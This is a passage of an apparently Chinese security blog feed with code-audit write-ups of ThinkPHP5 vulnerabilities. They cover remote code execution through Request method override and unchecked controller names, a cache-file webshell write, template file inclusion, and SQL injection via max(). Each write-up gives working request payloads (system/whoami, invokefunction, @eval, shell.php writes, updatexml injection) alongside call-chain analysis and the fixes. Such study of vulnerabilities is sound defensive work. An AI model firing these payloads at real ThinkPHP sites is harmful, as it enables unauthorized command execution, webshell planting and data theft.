    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.0.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.23  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</p><p>不同版本的payload稍作调整</p><pre><code># ThinkPHP &lt;= 5.0.13POST /?s=index/indexs=whoami&amp;_method=__construct&amp;method=&amp;filter[]=system# ThinkPHP &lt;= 5.0.23、5.1.0 &lt;= 5.1.16 需要开启框架app_debugPOST /_method=__construct&amp;filter[]=system&amp;server[REQUEST_METHOD]=ls -al# ThinkPHP &lt;= 5.0.23 需要存在xxx的method路由，例如captchaPOST /?s=xxx HTTP/1.1_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code></pre><p>ThinkPHP 5.0.23</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817665.png" alt="image-20240701151605981"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>官方发布的5.0.24版本更新中，提到本次更新包含了一个安全更新</p><p>查询commit记录</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817051.png" alt="image-20240701152553590"></p><p>可以看到$method来自可控的POST数组，并且没有任何过滤，直接把它作为Request类的方法进行调用。同时该方法传入的参数可控，也就是说可以随意调用Request类的部分方法。</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817664.png" alt="image-20240701153224596"></p><p>并且Request类的_construct方法中存在类属性覆盖</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817911.png" alt="image-20240701153712371"></p><p>Request类的所有属性：</p><pre><code>protected $get                  protected static $instance;protected $post                 protected $method;protected $request              protected $domain;protected $route                protected $url;protected $put;                 protected $baseUrl;protected $session              protected $baseFile;protected $file                 protected $root;protected $cookie               protected $pathinfo;protected $server               protected $path;protected $header               protected $routeInfo protected $mimeType             protected $env;protected $content;             protected $dispatch protected $filter;              protected $module;protected static $hook          protected $controller;protected $bind                 protected $action;protected $input;               protected $langset;protected $cache;               protected $param   protected $isCheckCache;    </code></pre><p>继续跟进，发现如果框架在配置文件中开启了debug模式，那么程序就会调用Request类的param方法，而这个方法又调用了filterValue方法，就可以利用call_user_func函数</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817829.png" alt="image-20240701154108578"></p><p>跟进param方法，发现调用了method方法，method方法又会调用server方法，而在server方法中把$this-&gt;server传入了input方法。</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817708.png" alt="image-20240701154355978"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817981.png" alt="image-20240701154806961"></p><p>$this-&gt;server的值，可以通过先前Request类的_construct方法来覆盖，也就是说$data可控传入input方法然后$data会被filterValue方法使用$filter过滤器处理，其中$filter的值部分来自$this-&gt;filter，又可以使用Request类的_construct方法来覆盖</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817254.png" alt="image-20240701155339102"></p><p>接下来就是filterValue方法调用call_user_func处理数据，产生代码执行</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817666.png" alt="image-20240701155519537"></p><p>上面讲的是开启debug触发RCE，那我们再来看看没有开启debug，怎么利用该漏洞。</p><p>在run方法中，会执行一个exec方法，当该方法中的$dispatch[‘type’]等于controller或者method时，又会调用Request类的param方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817184.png" alt="image-20240701160006568"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221817331.png" alt="image-20240701160036398"></p><p>再跟进Request类的param方法，后面的调用过程和前面一样，不再赘述</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818216.png" alt="image-20240701160205974"></p><p>我们还要解决一个问题，怎么让$dispatch[‘type’]等于controller或者method。跟进发现$dispatch[‘type’]来源于parseRule方法中的$result变量，而$result变量又与$route变量有关系，$route取决于程序中定义的路由地址方式</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818588.png" alt="image-20240701161149424"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818236.png" alt="image-20240701161448663"></p><p>在ThinkPHP5完整版中，定义了验证码类的路由地址。程序在初始化时，通过类自动机制，将vendor目录下的文件加载，然后GET方式中就多了这一条路由，我们可以利用这一路由地址使得$dispatch[‘type’]等于method，进而触发RCE。</p><p>最终payload:</p><pre><code>POST /index.php?s=captcha _method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=ls+-al# 或者_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=ls</code></pre><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>对请求方法$method进行白名单校验</p><h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C10/12.png" alt="12"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;漏洞影响版本：5.0.0&amp;lt;&amp;#x3D;ThinkPHP&amp;lt;&amp;#x3D;5.0.23  5.1.0&amp;lt;&amp;#x3D</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5代码审计:代码执行(二)</title>
    <link href="http://example.com/2024/06/12/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/"/>
    <id>http://example.com/2024/06/12/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%BA%8C/</id>
    <published>2024-06-12T13:37:27.000Z</published>
    <updated>2024-08-22T10:16:54.154Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.0.7&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.22  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.30</p><p>payload随版本调整:</p><p>5.1.x</p><pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=pwd?s=index/\think\view\driver\Php/display&amp;content=&lt;?php phpinfo();?&gt;?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=&lt;?php phpinfo();?&gt;?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></pre><p>5.0.x</p><pre><code>?s=index/think\config/get&amp;name=database.username # 获取配置信息?s=index/\think\Lang/load&amp;file=../../test.jpg    # 包含任意文件?s=index/\think\Config/load&amp;file=../../t.php     # 包含任意.php文件?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></pre><p>这里我用的是5.1.25</p><pre><code>?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815491.png" alt="image-20240612223655352"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>本次漏洞存在于ThinkPHP底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致RCE。</p><p>查阅官方的commit记录，发现其增加了对控制器名的检测</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815109.png" alt="image-20240612220446900"></p><p>首先，默认情况下ThinkPHP中没有开启强制路由选项，而是默认开启路由兼容模式(application&#x2F;config.php)</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816109.png" alt="image-20240612214813065"></p><p>这里没有开启强制路由，我们就可以使用路由兼容模式s参数，并且框架对控制器名没有检测，那么就可以调用任意的控制器。</p><p>尝试利用**?s&#x3D;模块&#x2F;控制器&#x2F;方法**来测试一下，在前面分析SQL注入时我们知道所有用户参数都会经过Request类的input方法，而input方法又调用了filterValue方法，filterValue方法使用了call_user_func，那么就可以构造</p><pre><code>?s=index/\think\Request/input&amp;filter[]=system&amp;data=whoami</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816422.png" alt="image-20240612220221561"></p><p>可以看到命令执行成功了(注意版本)，那么再去查看官方修改的$controller，可以看到控制器名是从$result获取的，而result的值来自兼容模式下的pathinfo，即s参数</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816906.png" alt="image-20240612221314556"></p><p>接着会跳到App类的run方法，进而调用Dispatch类的run方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816344.png" alt="image-20240612222638173"></p><p>该方法会调用exec方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816541.png" alt="image-20240612222753198"></p><p>exec方法中，利用反射机制，调用类的方法。这里的类、方法、参数都是可控的，并且没有进行检测，导致了RCE</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816339.png" alt="image-20240612223133249"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221816863.png" alt="image-20240612223215613"></p><p>最后注意5.0.x和5.1.x可利用的类不同</p><pre><code>ThinkPHP 5.1.x                  ThinkPHP 5.0.xstdClass                        stdClass Exception                       Exception ErrorException                  ErrorException Closure                         Closure Generator                       Generator DateTime                        DateTime DateTimeImmutable               DateTimeImmutable DateTimeZone                    DateTimeZone DateInterval                    DateInterval DatePeriod                      DatePeriod LibXMLError                     LibXMLError DOMException                    DOMException DOMStringList                   DOMStringList DOMNameList                     DOMNameList DOMImplementationList           DOMImplementationList DOMImplementationSource         DOMImplementationSource DOMImplementation               DOMImplementation DOMNode                         DOMNode DOMNameSpaceNode                DOMNameSpaceNode DOMDocumentFragment             DOMDocumentFragment DOMDocument                     DOMDocument DOMNodeList                     DOMNodeList DOMNamedNodeMap                 DOMNamedNodeMap DOMCharacterData                DOMCharacterData DOMAttr                         DOMAttr DOMElement                      DOMElement DOMText                         DOMText DOMComment                      DOMComment DOMTypeinfo                     DOMTypeinfo DOMUserDataHandler              DOMUserDataHandler DOMDomError                     DOMDomError DOMErrorHandler                 DOMErrorHandler DOMLocator                      DOMLocator DOMConfiguration                DOMConfiguration DOMCdataSection                 DOMCdataSection DOMDocumentType                 DOMDocumentType DOMNotation                     DOMNotation DOMEntity                       DOMEntity DOMEntityReference              DOMEntityReference DOMProcessingInstruction        DOMProcessingInstruction DOMStringExtend                 DOMStringExtend DOMXPath                        DOMXPath finfo                           finfo LogicException                  LogicException BadFunctionCallException        BadFunctionCallException BadMethodCallException          BadMethodCallException DomainException                 DomainException InvalidArgumentException        InvalidArgumentException LengthException                 LengthException OutOfRangeException             OutOfRangeException RuntimeException                RuntimeException OutOfBoundsException            OutOfBoundsException OverflowException               OverflowException RangeException                  RangeException UnderflowException              UnderflowException UnexpectedValueException        UnexpectedValueException RecursiveIteratorIterator       RecursiveIteratorIterator IteratorIterator                IteratorIterator FilterIterator                  FilterIterator RecursiveFilterIterator         RecursiveFilterIterator CallbackFilterIterator          CallbackFilterIterator RecursiveCallbackFilterIterator RecursiveCallbackFilterIterator ParentIterator                  ParentIterator LimitIterator                   LimitIterator CachingIterator                 CachingIterator RecursiveCachingIterator        RecursiveCachingIterator NoRewindIterator                NoRewindIterator AppendIterator                  AppendIterator InfiniteIterator                InfiniteIterator RegexIterator                   RegexIterator RecursiveRegexIterator          RecursiveRegexIterator EmptyIterator                   EmptyIterator RecursiveTreeIterator           RecursiveTreeIterator ArrayObject                     ArrayObject ArrayIterator                   ArrayIterator RecursiveArrayIterator          RecursiveArrayIterator SplFileInfo                     SplFileInfo DirectoryIterator               DirectoryIterator FilesystemIterator              FilesystemIterator RecursiveDirectoryIterator      RecursiveDirectoryIterator GlobIterator                    GlobIterator SplFileObject                   SplFileObject SplTempFileObject               SplTempFileObject SplDoublyLinkedList             SplDoublyLinkedList SplQueue                        SplQueue SplStack                        SplStack SplHeap                         SplHeap SplMinHeap                      SplMinHeap SplMaxHeap                      SplMaxHeap SplPriorityQueue                SplPriorityQueue SplFixedArray                   SplFixedArray SplObjectStorage                SplObjectStorage MultipleIterator                MultipleIterator SessionHandler                  SessionHandler ReflectionException             ReflectionException Reflection                      Reflection ReflectionFunctionAbstract      ReflectionFunctionAbstract ReflectionFunction              ReflectionFunction ReflectionParameter             ReflectionParameter ReflectionMethod                ReflectionMethod ReflectionClass                 ReflectionClass ReflectionObject                ReflectionObject ReflectionProperty              ReflectionProperty ReflectionExtension             ReflectionExtension ReflectionZendExtension         ReflectionZendExtension __PHP_Incomplete_Class          __PHP_Incomplete_Class php_user_filter                 php_user_filter Directory                       Directory SimpleXMLElement                SimpleXMLElement SimpleXMLIterator               SimpleXMLIterator SoapClient                      SoapClient SoapVar                         SoapVar SoapServer                      SoapServer SoapFault                       SoapFault SoapParam                       SoapParam SoapHeader                      SoapHeader PharException                   PharException Phar                            Phar PharData                        PharData PharFileInfo                    PharFileInfo XMLReader                       XMLReader XMLWriter                       XMLWriter ZipArchive                      ZipArchive PDOException                    PDOException PDO                             PDO PDOStatement                    PDOStatement PDORow                          PDORow CURLFile                        CURLFile Collator                        Collator NumberFormatter                 NumberFormatter Normalizer                      Normalizer Locale                          Locale MessageFormatter                MessageFormatter IntlDateFormatter               IntlDateFormatter ResourceBundle                  ResourceBundle Transliterator                  Transliterator IntlTimeZone                    IntlTimeZone IntlCalendar                    IntlCalendar IntlGregorianCalendar           IntlGregorianCalendar Spoofchecker                    Spoofchecker IntlException                   IntlException IntlIterator                    IntlIterator IntlBreakIterator               IntlBreakIterator IntlRuleBasedBreakIterator      IntlRuleBasedBreakIterator IntlCodePointBreakIterator      IntlCodePointBreakIterator IntlPartsIterator               IntlPartsIterator UConverter                      UConverter JsonIncrementalParser           JsonIncrementalParser mysqli_sql_exception            mysqli_sql_exception mysqli_driver                   mysqli_driver mysqli                          mysqli mysqli_warning                  mysqli_warning mysqli_result                   mysqli_result mysqli_stmt                     mysqli_stmt Composer\Autoload\ComposerStaticInit81a0c33d33d83a86fdd976e2aff753d9            Composer\Autoload\ComposerStaticInit8a67cf04fc9c0db5b85a9d897c12a44c think\Loader                    think\Loaderthink\Error                     think\Error think\Container                 think\Config think\App                       think\App think\Env                       think\Request think\Config                    think\Hook think\Hook                      think\Env think\Facade                    think\Lang think\facade\Env                think\Log env                             think\Routethink\Db think\Lang think\Request think\facade\Route route think\Route think\route\Rule think\route\RuleGroup think\route\Domain think\route\RuleItem think\route\RuleName think\route\Dispatch think\route\dispatch\Url think\route\dispatch\Module think\Middleware think\Cookie think\View think\view\driver\Think think\Template think\template\driver\File think\Log think\log\driver\File think\Session think\Debug think\Cache think\cache\Driver think\cache\driver\File </code></pre><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>使用正则表达式对控制器名进行合法性校验</p><pre><code>^[A-Za-z](\w)*$</code></pre><h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9/8.png" alt="8"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;漏洞影响版本：5.0.7&amp;lt;&amp;#x3D;ThinkPHP&amp;lt;&amp;#x3D;5.0.22  5.1.0&amp;lt;&amp;#x3D</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5代码审计:代码执行(一)</title>
    <link href="http://example.com/2024/06/07/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%B8%80/"/>
    <id>http://example.com/2024/06/07/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E4%B8%80/</id>
    <published>2024-06-07T10:35:35.000Z</published>
    <updated>2024-08-22T10:15:38.326Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本: 5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.10</p><p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use think\Cache;class Index&#123;    public function index()    &#123;        Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));        return &#39;Cache success&#39;;    &#125;&#125;</code></pre><p>payload:</p><pre><code>?username=p0l1st123%0d%0a@eval($_GET[_]);//</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815389.png" alt="image-20240607183904083"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>首先跟进Cache类的set方法，其首先通过单例模式init方法，创建了一个类实例，该类由cache的配置项type决定，默认情况下值为File</p><p>本例中，self::$handler为library\think\cache\driver\File类实例</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815382.png" alt="image-20240607184726294"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815875.png" alt="image-20240607184905731"></p><p>跟进File类的set方法，这里的$data首先经过了序列化处理，但是默认情况下$this-&gt;options[‘data_compress’]为false，所以$data不会经过gzcompress处理，虽然被序列化的数据前面拼接了注释，但是我们可以使用换行符绕过</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815799.png" alt="image-20240607191333361"></p><p>而文件名则调用了getCacheKey方法，跟进发现缓存文件的子目录和文件名均和缓存类设置的键($name)有关,首先获取键名的md5值，md5值的前两个字符作为缓存子目录，后三十字符作为缓存文件名，如果设置了$this-&gt;options[‘prefix’]，那么缓存文件还多一个上级目录</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221815965.png" alt="image-20240607191131248"></p><p>如果想要利用这个漏洞，首先得知道缓存类设置的键名，才能找到webshell路径，这里的shell是写入到了runtime目录下，但是如果写入public目录下，无法访问到。并且如果设置$this-&gt;options[‘prefix’]，没有源码还是无法获取webshell的路径</p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>将数据拼接在php标签之外，并在php标签中拼接exit()函数</p><h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C8/6.png" alt="6"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;漏洞影响版本: 5.0.0&amp;lt;&amp;#x3D;ThinkPHP5&amp;lt;&amp;#x3D;5.0.10&lt;/p&gt;
&lt;p&gt;applic</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5代码审计:文件包含</title>
    <link href="http://example.com/2024/06/06/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://example.com/2024/06/06/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</id>
    <published>2024-06-06T11:20:41.000Z</published>
    <updated>2024-08-22T10:19:20.180Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.0.0&lt;&#x3D;ThinkPHP5&lt;&#x3D;5.0.18  5.1.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.10</p><p>application&#x2F;index&#x2F;controller&#x2F;Index.php</p><pre><code class="php">&lt;?phpnamespace app\index\controller;use think\Controller;class Index extends Controller&#123;    public function index()    &#123;        $this-&gt;assign(request()-&gt;get());        return $this-&gt;fetch(); // 当前模块/默认视图目录/当前控制器（小写）/当前操作（小写）.html    &#125;&#125;</code></pre><p>创建application&#x2F;index&#x2F;view&#x2F;index&#x2F;index.html文件，将图片马放到public目录下</p><p>payload:</p><pre><code>/index/index/index?cacheFile=123.jpg</code></pre><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818459.png" alt="image-20240606192452782"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>用户输入的数据未经过滤，直接通过Controller类的assign方法进行模板变量赋值</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818033.png" alt="image-20240606193202886"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818602.png" alt="image-20240606193218869"></p><p>并且assign方法又调用了view类的assign方法，将数据存储到$data</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818205.png" alt="image-20240606193424205"></p><p>然后调用fetch方法加载模板输出，如果没有指定模板名称，就会使用默认的文件作为模板，默认路径模板不存在，就会报错</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818982.png" alt="image-20240606193641967"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818232.png" alt="image-20240606194209788"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221818199.png" alt="image-20240606194355531"></p><p>跟进到Template类的fetch方法，可控变量$vars首先赋值给$this-&gt;$data，最终传入File类的read方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221819472.png" alt="image-20240606194627385"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221819597.png" alt="image-20240606194644620"></p><p>而read方法使用了extract函数后，直接包含了$cacheFile,这样就产生了文件包含漏洞</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221819042.png" alt="image-20240606195009007"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>先将$cacheFile变量存储在$this-&gt;cacheFile中，使用extract函数后，最终include包含$this-&gt;cacheFile,避免include包含的值被覆盖</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221819435.png" alt="image-20240606195227631"></p><h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7/7.png" alt="7"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;漏洞影响版本：5.0.0&amp;lt;&amp;#x3D;ThinkPHP5&amp;lt;&amp;#x3D;5.0.18  5.1.0&amp;lt;&amp;#x3</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5代码审计:SQL注入(四)</title>
    <link href="http://example.com/2024/06/05/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5-%E5%9B%9B/"/>
    <id>http://example.com/2024/06/05/ThinkPHP5%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-SQL%E6%B3%A8%E5%85%A5-%E5%9B%9B/</id>
    <published>2024-06-05T11:12:54.000Z</published>
    <updated>2024-08-22T10:15:01.795Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h1><p>漏洞影响版本：5.0.0&lt;&#x3D;ThinkPHP&lt;&#x3D;5.0.21  5.1.3&lt;&#x3D;ThinkPHP&lt;&#x3D;5.1.25</p><p>application&#x2F;index&#x2F;controller&#x2F;Index.php </p><pre><code class="php">&lt;?phpnamespace app\index\controller;class Index&#123;    public function index()    &#123;        $options = request()-&gt;get(&#39;options&#39;);        $result = db(&#39;users&#39;)-&gt;max($options);        var_dump($result);    &#125;&#125;</code></pre><p>payload随版本需要调整：</p><p>5.0.0<del>5.0.21  5.1.3</del>5.1.10 ： id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p><p>5.1.11~5.1.25 ：id&#96;)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814437.png" alt="image-20240605192126421"></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>数据没有过滤就传入max方法进行聚合查询语句构造，所以我们先跟进max方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814106.png" alt="image-20240605192506812"></p><p>而max方法调用了本类的aggregate方法，aggregate方法又调用了Mysql类的aggregate方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814851.png" alt="image-20240605192809733"></p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814882.png" alt="image-20240605203943732"></p><p>可以看到，在aggregate方法中，对变量使用了parseKey方法进行处理，然后拼接SQL语句</p><p>我们再跟进parseKey方法，这里只是对变量两端添加了反引号</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814935.png" alt="image-20240605204813207"></p><p>那么再回到上图的$this-&gt;value方法，该方法调用了Builder类的select方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814305.png" alt="image-20240605205202722"></p><p>用户传入的数据存储在$options[‘field’]变量中，传入parseField方法，跟进这个方法</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814002.png" alt="image-20240605205453069"></p><p>数据在这里只是经过了parseKey方法，然后使用逗号拼接，并没有经过任何过滤，那么就可以直接构造SQL语句</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814571.png" alt="image-20240605205817721"></p><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><p>匹配到字母、点号、星号以外的字符直接抛出异常</p><p><img src="https://p0l1st.oss-cn-beijing.aliyuncs.com/img/202408221814793.png" alt="image-20240605210535967"></p><h1 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h1><p><img src="https://github.com/Mochazz/ThinkPHP-Vuln/raw/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/7.png" alt="7"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;漏洞环境&quot;&gt;&lt;a href=&quot;#漏洞环境&quot; class=&quot;headerlink&quot; title=&quot;漏洞环境&quot;&gt;&lt;/a&gt;漏洞环境&lt;/h1&gt;&lt;p&gt;漏洞影响版本：5.0.0&amp;lt;&amp;#x3D;ThinkPHP&amp;lt;&amp;#x3D;5.0.21  5.1.3&amp;lt;&amp;#x3D</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5代码审计:SQL注入(三)</title>
